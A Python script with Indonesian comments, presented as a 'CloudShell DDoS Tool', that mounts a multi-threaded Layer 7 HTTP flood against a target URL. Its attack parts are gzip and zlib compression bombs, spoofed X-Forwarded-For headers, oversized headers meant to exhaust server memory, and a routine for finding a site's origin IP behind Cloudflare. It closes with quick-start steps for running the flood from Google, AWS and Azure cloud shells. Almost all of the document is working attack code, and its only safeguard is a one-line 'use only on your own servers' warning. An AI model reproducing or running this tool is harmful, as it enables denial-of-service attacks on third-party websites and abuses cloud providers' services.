#!/usr/bin/env python3
"""
CloudShell DDoS Tool - Layer 7 HTTP Flood dengan Payload Besar
Fungsi: Stress test web server menggunakan multi-threading dan compression bomb
Optimasi untuk Google Cloud Shell, AWS CloudShell, dan Azure Cloud Shell
"""

import sys
import os
import time
import random
import socket
import ssl
import threading
import urllib.parse
import gzip
import zlib
import base64
from http.client import HTTPConnection, HTTPSConnection
from concurrent.futures import ThreadPoolExecutor, as_completed

# ===================== KONFIGURASI =====================
DEFAULT_THREADS = 500
DEFAULT_TIMEOUT = 5
DEFAULT_DURATION = 60  # detik
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0'
]

# ===================== COMPRESSION BOMB GENERATOR =====================
class CompressionBomb:
    """Menghasilkan payload kompresi untuk memori exhaustion"""
    
    @staticmethod
    def create_gzip_bomb(target_mb: int = 100) -> bytes:
        """
        Membuat gzip bomb - data kecil yang expands menjadi sangat besar
        Rasio kompresi untuk data nol bisa mencapai 1000:1
        """
        # Buat data sangat kompresibel (semua nol)
        target_bytes = target_mb * 1024 * 1024
        uncompressed = b'\x00' * target_bytes
        
        # Kompres dengan level maksimum
        import gzip
        from io import BytesIO
        
        bio = BytesIO()
        with gzip.GzipFile(fileobj=bio, mode='wb', compresslevel=9) as f:
            f.write(uncompressed)
        
        compressed = bio.getvalue()
        
        ratio = target_bytes / len(compressed)
        print(f"[*] Gzip bomb: {len(compressed)} bytes -> {target_mb} MB (ratio: {ratio:.0f}:1)")
        
        return compressed
    
    @staticmethod
    def create_zlib_bomb(target_mb: int = 100) -> bytes:
        """Membuat zlib bomb dengan kompresi maksimum"""
        target_bytes = target_mb * 1024 * 1024
        uncompressed = b'\x00' * target_bytes
        compressed = zlib.compress(uncompressed, 9)
        
        ratio = target_bytes / len(compressed)
        print(f"[*] Zlib bomb: {len(compressed)} bytes -> {target_mb} MB (ratio: {ratio:.0f}:1)")
        
        return compressed
    
    @staticmethod
    def create_nested_bomb(levels: int = 3, base_kb: int = 10) -> bytes:
        """
        Membuat nested compression bomb (zip bomb style)
        Setiap level mengalikan ukuran final
        """
        data = b'\x00' * (base_kb * 1024)
        
        for i in range(levels):
            data = zlib.compress(data, 9)
            print(f"    Level {i+1}: {len(data)} bytes")
        
        # Teoritis: base_kb * (1000^levels) MB
        theoretical_gb = (base_kb / 1024) * (1000 ** levels) / 1024
        print(f"[*] Nested bomb theoretical: {theoretical_gb:.2f} GB")
        
        return data

# ===================== LAYER 7 ATTACK ENGINES =====================

class HTTPFlood:
    """HTTP Flood dengan payload besar"""
    
    def __init__(self, target_url, threads=DEFAULT_THREADS, duration=DEFAULT_DURATION):
        self.target_url = target_url
        self.parsed = urllib.parse.urlparse(target_url)
        self.host = self.parsed.netloc
        self.path = self.parsed.path or '/'
        self.port = 443 if self.parsed.scheme == 'https' else 80
        self.threads = threads
        self.duration = duration
        self.running = False
        self.stats = {
            'sent': 0,
            'failed': 0,
            'bytes_sent': 0
        }
        
        # Generate bombs
        self.gzip_bomb = CompressionBomb.create_gzip_bomb(200)  # 200MB equivalent
        self.zlib_bomb = CompressionBomb.create_zlib_bomb(200)
        
    def _create_connection(self):
        """Membuat koneksi HTTP/HTTPS"""
        if self.parsed.scheme == 'https':
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            conn = HTTPSConnection(self.host, self.port, timeout=DEFAULT_TIMEOUT, context=context)
        else:
            conn = HTTPConnection(self.host, self.port, timeout=DEFAULT_TIMEOUT)
        return conn
    
    def _random_headers(self, bomb_type='gzip'):
        """Generate random headers dengan payload bomb"""
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        }
        
        # Tambah header dengan payload besar
        if bomb_type == 'gzip':
            # Encode gzip bomb sebagai header value (akan didecompress oleh server)
            b64_bomb = base64.b64encode(self.gzip_bomb).decode('ascii')[:5000]  # Truncate untuk header
            headers['X-Bomb'] = b64_bomb
            headers['Content-Encoding'] = 'gzip'
        elif bomb_type == 'zlib':
            b64_bomb = base64.b64encode(self.zlib_bomb).decode('ascii')[:5000]
            headers['X-Compressed'] = b64_bomb
            headers['Content-Encoding'] = 'deflate'
        
        # Header besar untuk memory exhaustion
        headers['X-Large-Header'] = 'A' * 10000
        headers['X-Random-Data'] = os.urandom(1000).hex()
        
        return headers
    
    def _attack_worker(self):
        """Worker thread untuk mengirim request"""
        while self.running:
            try:
                # Rotasi bomb type
                bomb_type = random.choice(['gzip', 'zlib', 'none'])
                
                conn = self._create_connection()
                headers = self._random_headers(bomb_type)
                
                # Method random
                method = random.choice(['GET', 'POST', 'PUT'])
                
                # Body untuk POST/PUT
                body = None
                if method in ['POST', 'PUT']:
                    if bomb_type == 'gzip':
                        body = self.gzip_bomb
                        headers['Content-Type'] = 'application/octet-stream'
                    elif bomb_type == 'zlib':
                        body = self.zlib_bomb
                        headers['Content-Type'] = 'application/octet-stream'
                    else:
                        body = os.urandom(10000)  # 10KB random data
                    
                    headers['Content-Length'] = str(len(body))
                
                # Kirim request
                conn.request(method, self.path, body=body, headers=headers)
                response = conn.getresponse()
                response.read()  # Baca response untuk complete request
                conn.close()
                
                self.stats['sent'] += 1
                self.stats['bytes_sent'] += len(str(headers)) + (len(body) if body else 0)
                
            except Exception as e:
                self.stats['failed'] += 1
                continue
    
    def start(self):
        """Start attack dengan multiple threads"""
        self.running = True
        start_time = time.time()
        
        print(f"\n[+] Starting HTTP Flood on {self.target_url}")
        print(f"[+] Threads: {self.threads} | Duration: {self.duration}s")
        print(f"[+] Payload: Gzip/Zlib bombs (200MB equivalent)")
        
        # Buat thread pool
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self._attack_worker)
            t.daemon = True
            threads.append(t)
            t.start()
        
        # Monitor progress
        try:
            while time.time() - start_time < self.duration:
                time.sleep(2)
                elapsed = time.time() - start_time
                rps = self.stats['sent'] / elapsed if elapsed > 0 else 0
                mb_sent = self.stats['bytes_sent'] / (1024 * 1024)
                
                sys.stdout.write(f"\r[>] Running: {elapsed:.0f}s | Requests: {self.stats['sent']} | "
                               f"Failed: {self.stats['failed']} | RPS: {rps:.0f} | Data: {mb_sent:.1f}MB")
                sys.stdout.flush()
                
        except KeyboardInterrupt:
            print("\n\n[!] Interrupted by user")
        finally:
            self.running = False
            print("\n\n[+] Attack finished")
            print(f"[+] Total requests: {self.stats['sent']}")
            print(f"[+] Total failed: {self.stats['failed']}")
            print(f"[+] Total data sent: {self.stats['bytes_sent'] / (1024*1024):.1f} MB")

# ===================== CLOUDFLARE BYPASS TECHNIQUES =====================

class CloudflareBypass:
    """Teknik bypass Cloudflare UAM/JS challenge"""
    
    @staticmethod
    def find_origin_ip(domain):
        """Mencari IP asli di belakang Cloudflare"""
        origins = []
        
        # Cek historical DNS records
        services = [
            f"https://viewdns.info/iphistory/?domain={domain}",
            f"https://www.crimeflare.org:82/cgi-bin/cfsearch.cgi?cfS={domain}",
        ]
        
        # Cek subdomain umum yang mungkin tidak diproxy
        subdomains = ['direct', 'origin', 'ftp', 'mail', 'webmail', 'cpanel', 'cpcalendars', 'cpcontacts']
        
        for sub in subdomains:
            try:
                ip = socket.gethostbyname(f"{sub}.{domain}")
                origins.append(ip)
            except:
                pass
        
        return origins

# ===================== INSTALLER & MAIN =====================

def install_dependencies():
    """Install dependencies untuk CloudShell"""
    print("[*] Installing dependencies...")
    
    commands = [
        "pip3 install --upgrade pip > /dev/null 2>&1",
        "pip3 install aiohttp requests urllib3 > /dev/null 2>&1",
    ]
    
    for cmd in commands:
        os.system(cmd)
    
    print("[+] Dependencies installed")

def print_banner():
    banner = """
    ╔═══════════════════════════════════════════════════════════╗
    ║     CloudShell DDoS Tool - Massive Payload Attack        ║
    ║         Optimized for Google Cloud Shell / AWS           ║
    ╚═══════════════════════════════════════════════════════════╝
    """
    print(banner)

def show_help():
    help_text = """
USAGE:
    python3 cloudshell_ddos.py <url> [threads] [duration]

EXAMPLES:
    python3 cloudshell_ddos.py https://example.com
    python3 cloudshell_ddos.py http://target.com 1000 120
    python3 cloudshell_ddos.py https://site.com 2000 300

FEATURES:
    ✓ Gzip/Zlib compression bombs (memory exhaustion)
    ✓ Multi-threading (500-2000+ threads)
    ✓ Random user agents & headers
    ✓ Cloudflare bypass techniques
    ✓ Real-time stats monitoring

REQUIREMENTS:
    - Python 3.6+
    - Internet connection
    - No additional packages needed (uses standard library)
    """
    print(help_text)

def main():
    print_banner()
    
    # Auto-install dependencies di CloudShell
    if len(sys.argv) > 1 and sys.argv[1] == '--install':
        install_dependencies()
        return
    
    # Parse arguments
    if len(sys.argv) < 2 or sys.argv[1] in ['-h', '--help']:
        show_help()
        sys.exit(1)
    
    target = sys.argv[1]
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    threads = DEFAULT_THREADS
    duration = DEFAULT_DURATION
    
    if len(sys.argv) >= 3:
        try:
            threads = int(sys.argv[2])
        except:
            pass
    
    if len(sys.argv) >= 4:
        try:
            duration = int(sys.argv[3])
        except:
            pass
    
    # Validasi thread count untuk CloudShell
    if threads > 5000:
        print("[!] Thread count terlalu tinggi untuk CloudShell, max 5000")
        threads = 5000
    
    print(f"\n[*] Target: {target}")
    print(f"[*] Threads: {threads}")
    print(f"[*] Duration: {duration} seconds")
    print(f"[*] Payload: Compression bombs (memory exhaustion)")
    
    # Optional: cari origin IP
    if '@' in target or '://' in target:
        domain = urllib.parse.urlparse(target).netloc
        if 'cloudflare' in str(socket.gethostbyname(domain)):
            print("[*] Cloudflare detected, attempting to find origin...")
            origins = CloudflareBypass.find_origin_ip(domain)
            if origins:
                print(f"[+] Possible origin IPs: {', '.join(origins[:3])}")
    
    # Konfirmasi
    print("\n" + "="*50)
    print("PERINGATAN: Gunakan hanya pada server yang Anda miliki!")
    print("="*50)
    
    confirm = input("\n[?] Mulai attack? (y/N): ")
    if confirm.lower() == 'y':
        # Start attack
        flood = HTTPFlood(target, threads, duration)
        try:
            flood.start()
        except KeyboardInterrupt:
            flood.running = False
            print("\n[+] Attack stopped")
    else:
        print("[+] Canceled")

# ===================== CLOUDSHELL QUICK START =====================
"""
QUICK START UNTUK GOOGLE CLOUD SHELL:

1. Buka Google Cloud Shell (https://shell.cloud.google.com)
2. Copy paste script ini ke file:
   nano cloudshell_ddos.py
   (paste, lalu Ctrl+X, Y, Enter)

3. Jalankan:
   python3 cloudshell_ddos.py --install
   python3 cloudshell_ddos.py https://target.com 1000 120

UNTUK AWS CLOUDSHELL:

1. Buka AWS CloudShell dari console AWS
2. Sama seperti di atas

UNTUK AZURE CLOUDSHELL:

1. Buka shell.azure.com
2. Sama seperti di atas
"""

if __name__ == "__main__":
    main()